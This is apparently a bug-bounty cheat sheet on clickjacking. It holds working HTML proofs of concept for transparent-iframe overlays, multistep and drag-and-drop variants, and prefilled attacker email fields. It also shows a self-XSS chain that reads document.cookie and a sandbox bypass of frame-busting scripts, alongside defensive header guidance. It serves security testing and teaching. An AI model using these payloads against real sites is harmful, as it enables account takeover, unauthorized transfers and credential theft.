## 🎯 Overview

**Clickjacking** is an interface-based attack where users are tricked into clicking on hidden or disguised elements on a webpage. The attacker overlays a transparent iframe of a legitimate site over a decoy page, hijacking clicks to perform unintended actions.

**Common impacts:**

- Downloading malware
- Providing credentials or sensitive information
- Money transfers
- Purchasing products
- OAuth permission grants
- Account takeovers

---

## 🔍 Detection & Testing

### Quick Test Methods

**Method 1: Browser Test**

```html
<html>
<head>
    <title>Clickjacking / framing test</title>
</head>
<body>
    <h1>Test a page for clickjacking/framing vulnerability</h1>
    <p>Enter the URL to frame:</p>
    <input id="url" type="text" value="http://TARGET.com"></input>
    <button id="submit-test" onclick='document.getElementById("iframe").src=document.getElementById("url").value'>Test it!</button>
    <br /><br /><hr><br />
    <iframe src="about:blank" id="iframe" width="100%" height="75%"></iframe>
</body>
</html>
```

**Method 2: Basic POC**

```html
<html>
<head>
    <title>This website is vulnerable to clickjacking</title>
</head>
<body>
    <iframe style="height: 500px; width: 500px;" src="https://<target-site>"></iframe>
</body>
</html>
```

### Check for Protections

Look for these headers in responses:

- `X-Frame-Options: deny/sameorigin/allow-from`
- `Content-Security-Policy: frame-ancestors 'none'/'self'/domain.com`

**No headers = potentially vulnerable**

---

## 💉 Exploitation Methods

### 1. Basic Clickjacking

**When to use:** Simple one-click actions (delete, confirm, submit)

```html
<style>
   iframe {
       position:relative;
       width: 500px;
       height: 700px;
       opacity: 0.1;
       z-index: 2;
   }
   div {
       position:absolute;
       top:470px;
       left:60px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```

**Adjust:**

- `opacity` - Lower for testing (0.1), set to 0.00001 for real attack
- `top` and `left` - Position decoy over target button
- `width` and `height` - Match iframe to target page size

---

### 2. Multistep Clickjacking

**When to use:** Actions requiring 2+ clicks (confirm dialogs, multi-step forms)

```html
<style>
   iframe {
       position:relative;
       width: 500px;
       height: 500px;
       opacity: 0.1;
       z-index: 2;
   }
   .firstClick, .secondClick {
       position:absolute;
       top:330px;
       left:60px;
       z-index: 1;
   }
   .secondClick {
       left:210px;
   }
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```

---

### 3. Prepopulate Forms Trick

**When to use:** Target has form fields that accept GET parameters

**How it works:**

- Load vulnerable page with GET params: `?email=attacker@evil.com&password=hacked123`
- Form fields auto-populate with malicious data
- Trick user into clicking Submit button

```html
<style>
   iframe {
       position:relative;
       width: 500px;
       height: 700px;
       opacity: 0.00001;
       z-index: 2;
   }
   div {
       position:absolute;
       top:520px;
       left:80px;
       z-index: 1;
   }
</style>
<div>Click to claim your prize!</div>
<iframe src="https://victim.com/profile/update?email=attacker@evil.com"></iframe>
```

---

### 4. Drag & Drop + Click

**When to use:** Need to fill form fields without direct input

```html
<html>
<head>
<style>
#payload{
    position: absolute;
    top: 20px;
}
iframe{
    width: 1000px;
    height: 675px;
    border: none;
}
.xss{
    position: fixed;
    background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3" src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```

**Attack flow:**

1. User clicks and deletes existing content
2. User drags your element to input field
3. User clicks submit button

[**Example in action**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/)

---

### 5. DoubleClickjacking 🔥

**When to use:** Bypass all clickjacking protections, target OAuth prompts

**Why it's powerful:**

- Uses timing between `mousedown` and `onclick` events
- Victim page loads DURING the double-click
- Only 1 click needed on victim page = perfect for OAuth "Allow" buttons

**How it works:**

1. Victim double-clicks custom button on your page
2. First click triggers mousedown
3. During second click, victim iframe loads
4. Second click actually hits the real button on victim page

[**Video demo**](https://www.youtube.com/watch?v=4rGvRRMrD18) | [**Code example**](https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html)

**Best targets:**

- OAuth authorization prompts
- One-click confirmation dialogs
- "Allow permissions" buttons

---

### 6. XSS + Clickjacking Combo

**When to use:** Self-XSS that requires user interaction + vulnerable page

**Scenario:**

- You found self-XSS in profile settings (only you can trigger it)
- Settings page is vulnerable to clickjacking
- Settings form accepts GET parameters

**Attack chain:**

1. Create clickjacking page
2. Prepopulate form with XSS payload via GET params
3. Trick user into clicking Submit
4. When form saves, XSS triggers for the victim

```html
<style>
   iframe {
       position:relative;
       width: 600px;
       height: 800px;
       opacity: 0.00001;
       z-index: 2;
   }
   div {
       position:absolute;
       top:650px;
       left:100px;
       z-index: 1;
   }
</style>
<div>Update your settings to win!</div>
<iframe src="https://victim.com/settings?bio=<script>alert(document.cookie)</script>"></iframe>
```

---

## 🛡️ Bypassing Protections

### Bypass Frame-Busting Scripts

**Target code:**

```javascript
if (top !== self) {
  top.location = self.location
}
```

**Bypass with iframe sandbox:**

```html
<iframe 
  id="victim" 
  src="https://victim-site.com" 
  sandbox="allow-forms allow-scripts">
</iframe>
```

**Why it works:**

- `sandbox` without `allow-top-navigation` blocks frame-busting
- Iframe can't verify if it's the top window
- Script fails silently

**Common sandbox combinations:**

```html
<!-- Basic bypass -->
sandbox="allow-forms allow-scripts"

<!-- If target needs more functionality -->
sandbox="allow-forms allow-scripts allow-same-origin allow-modals"

<!-- Maximum compatibility -->
sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts"
```

**Pro tip:** Check browser console for errors, add permissions as needed

---

## 🎯 Higher Impact Scenarios

### 1. OAuth Account Takeover

- Target: OAuth authorization pages without proper framing protection
- Use: DoubleClickjacking to hijack "Allow" button
- Impact: Full account takeover via OAuth token theft

### 2. Financial Transactions

- Target: Banking/payment pages with one-click transfers
- Combine with prepopulated forms
- Impact: Unauthorized money transfers

### 3. Admin Panel Actions

- Target: Admin dashboards with delete/modify functions
- Use multistep clickjacking for confirmations
- Impact: Data deletion, privilege escalation

### 4. Social Engineering Chains

- Target: Profile update pages
- Drag & drop attacker's email/phone
- Impact: Account takeover via password reset

---

## 🛠️ Tools

- **Burp Clickbandit:** [https://portswigger.net/burp/documentation/desktop/tools/clickbandit](https://portswigger.net/burp/documentation/desktop/tools/clickbandit)
- **X-Frame-Options Test:** [https://gf.dev/x-frame-options-test](https://gf.dev/x-frame-options-test)
- **Clickjacking Tester:** [https://github.com/D4Vinci/Clickjacking-Tester](https://github.com/D4Vinci/Clickjacking-Tester)

---

## 🔒 Mitigations (For Reference)

### Server-Side (Recommended)

**X-Frame-Options Header:**

```
X-Frame-Options: deny                           # Block all framing
X-Frame-Options: sameorigin                     # Allow same domain only
X-Frame-Options: allow-from https://trusted.com # Allow specific domain
```

**CSP frame-ancestors (Modern):**

```
Content-Security-Policy: frame-ancestors 'none';              # Block all
Content-Security-Policy: frame-ancestors 'self';              # Same origin
Content-Security-Policy: frame-ancestors trusted.com;         # Specific domain
Content-Security-Policy: frame-ancestors 'self' trusted.com;  # Multiple sources
```

**CSP frame-src (Controls what can frame):**

```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```

**CSP child-src (Legacy fallback):**

```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```

### Client-Side (Weak, Bypassable)

```javascript
// Basic frame buster
if (top !== self) {
  top.location = self.location
}
```

**Note:** Easily bypassed with iframe sandbox attribute

### Additional Defenses

- **Anti-CSRF Tokens:** Prevent actions from clickjacked pages (token validation fails)
- **Re-authentication:** Require password for sensitive actions
- **User Confirmation:** Multi-step confirmations for critical operations

---

## 📚 References

- [PortSwigger Clickjacking](https://portswigger.net/web-security/clickjacking)
- [OWASP Clickjacking Defense](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
- [OWASP Clickjacking Attacks](https://owasp.org/www-community/attacks/Clickjacking)
- [Netsparker Guide](https://www.netsparker.com/blog/web-security/clickjacking-attacks/)
- [JavaScript.info Tutorial](https://javascript.info/clickjacking)
- [Google Clickjacking Case](https://medium.com/@raushanraj_65039/google-clickjacking-6a04132b918a)
- [$1800 Clickjacking Bug](https://medium.com/@osamaavvan/1800-worth-clickjacking-1f92e79d0414)
- [Twitter Worm Exploit](https://shiflett.org/blog/2009/twitter-dont-click-exploit)
- [Facebook Likes Attack](https://www.netsparker.com/blog/web-security/clickjacking-attack-on-facebook-how-tiny-attribute-save-corporation/)
- [DoubleClickjacking Explanation](https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html)
- [DoubleClickjacking News](https://securityaffairs.com/172572/hacking/doubleclickjacking-clickjacking-on-major-websites.html)

---

**🚀 Quick Win Tips:**

- Always test OAuth flows first (high impact)
- Look for GET parameter form prepopulation
- DoubleClickjacking bypasses everything - use it
- Combine with self-XSS for maximum impact
- Check mobile apps' webviews (often unprotected)